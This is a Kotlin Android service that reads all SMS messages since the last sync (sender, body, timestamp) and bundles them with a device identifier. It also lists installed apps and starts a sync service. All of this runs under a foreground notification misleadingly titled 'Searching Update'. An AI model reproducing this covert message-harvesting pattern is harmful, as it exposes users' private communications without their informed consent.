package info.kalagato.com.extractor.readers

import android.Manifest
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ContentResolver
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.*
import android.provider.Settings
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import com.google.gson.JsonObject
import com.google.gson.JsonParser
import info.kalagato.com.extractor.Constant
import info.kalagato.com.extractor.Extractor
import info.kalagato.com.extractor.R
import info.kalagato.com.extractor.SyncService
import info.kalagato.com.extractor.Util.getDeviceId
import info.kalagato.com.extractor.Util.getLastSyncTime
import info.kalagato.com.extractor.Util.setLastSyncDateTime
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.*


class ReadSMSService : Service() {
    private val TAG = "read-sms-service"
    private var mServiceLooper: Looper? = null
    private var mServiceHandler: ServiceHandler? = null
    val smsObject = JSONObject()
    override fun onCreate() {
//        Log.d(TAG,"onCreate");
        // Start up the thread running the service.  Note that we create a
        // separate thread because the service normally runs in the process's
        // main thread, which we don't want to block.  We also make it
        // background priority so CPU-intensive work will not disrupt our UI.
        val thread = HandlerThread("SMS_ServiceStartArguments", Process.THREAD_PRIORITY_FOREGROUND)
        thread.start()

        // Get the HandlerThread's Looper and use it for our Handler
        mServiceLooper = thread.looper
        mServiceHandler = ServiceHandler(mServiceLooper)
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
//        Log.d(TAG,"onStartCommand");
        val notificationIntent = Intent(applicationContext, Extractor::class.java)
        val pendingIntent = PendingIntent.getActivity(
            applicationContext,
            0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(
                Constant.CHANNEL_ID,
                "My Foreground Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = ContextCompat.getSystemService(
                applicationContext, NotificationManager::class.java
            )
            manager?.createNotificationChannel(chan)
        }
        val notification = NotificationCompat.Builder(
            applicationContext,
            Constant.CHANNEL_ID
        ) //todo fix hardcoded channel id
            .setSmallIcon(R.drawable.ic_settings)
            .setOngoing(true)
            .setContentTitle("Searching Update")
            .setContentText("")
            .setShowWhen(false)
            .setContentIntent(pendingIntent)
            .build()
        startForeground(1, notification)
        try {
//            Log.d(TAG,"sending msg");
            // For each start request, send a message to start a job and deliver the
            // start ID so we know which request we're stopping when we finish the job
            val msg = mServiceHandler!!.obtainMessage()
            msg.arg1 = startId
            // Create a bundle with the data
            val bundle = Bundle()

            // Set the bundle data to the Message
            msg.data = bundle
            mServiceHandler!!.sendMessage(msg)
        } catch (e: Exception) {
//            Log.d("read-sms-service","error in starting handler",e);
        }

        //do heavy work on a background thread
//        Log.d(TAG,"do your work");
        //stopSelf();
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        stopForeground(true)
        super.onDestroy()
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    // Handler to run on a thread to work in background
    private inner class ServiceHandler(looper: Looper?) : Handler(looper!!) {
        override fun handleMessage(msg: Message) {
//            Log.d(TAG,"handleMessage");
            val smsArray:JSONArray? = getAllSms()
           smsObject.put("hardware_id",Settings.Secure.ANDROID_ID)
           smsObject.put("sms_array",smsArray)

            AppRunningStatus().getAllPackageInstalled(applicationContext)
            //            new AppRunningStatus().getAppUsage(getApplicationContext());

            //checking sync
            val serviceIntent = Intent(applicationContext, SyncService::class.java)
            ContextCompat.startForegroundService(applicationContext, serviceIntent)
            // Stop the service using the startId, so that we don't stop
            // the service in the middle of handling another job
            stopSelf(msg.arg1)
        }


        @SuppressLint("Range")
        fun getAllSms(): JSONArray {
            if (ContextCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.READ_SMS
                ) == PackageManager.PERMISSION_GRANTED
            ) {

                //Sync message with the current time to gte the Incremental Messages
                val currentSyncTime = Date().time
                val lastSyncTime = getLastSyncTime(
                    applicationContext
                )
                // Now create a SimpleDateFormat object.
                val filter = if (lastSyncTime == 0L) {
                    " date <= $currentSyncTime"
                } else {
                    " date <= $currentSyncTime and date >= $lastSyncTime"
                }


                val message = Uri.parse("content://sms/")
                val cr: ContentResolver = contentResolver
                val c: Cursor? = cr.query(message, null,filter, null, null)
                //Activity().startManagingCursor(c)
                val totalSMS: Int = c!!.count
                val jsonArray = JSONArray()

                if (c.moveToFirst()) {
                    for (i in 0 until totalSMS) {
                        val jsonObject = JSONObject()
                        jsonObject.put("sender_id",c.getString(c.getColumnIndexOrThrow("address")))
                        jsonObject.put("body",c.getString(c.getColumnIndexOrThrow("body")))
                        jsonObject.put("message_timestamp",c.getString(c.getColumnIndexOrThrow("date")))
                        jsonObject.put("app_name",applicationContext.packageName)
                        jsonArray.put(jsonObject)
                        c.moveToNext()
                    }
                }
                // else {
                // throw new RuntimeException("You have no SMS");
                // }
                c.close()
                setLastSyncDateTime(applicationContext, currentSyncTime)
                return jsonArray
            }
            return JSONArray()
        }
    }
}
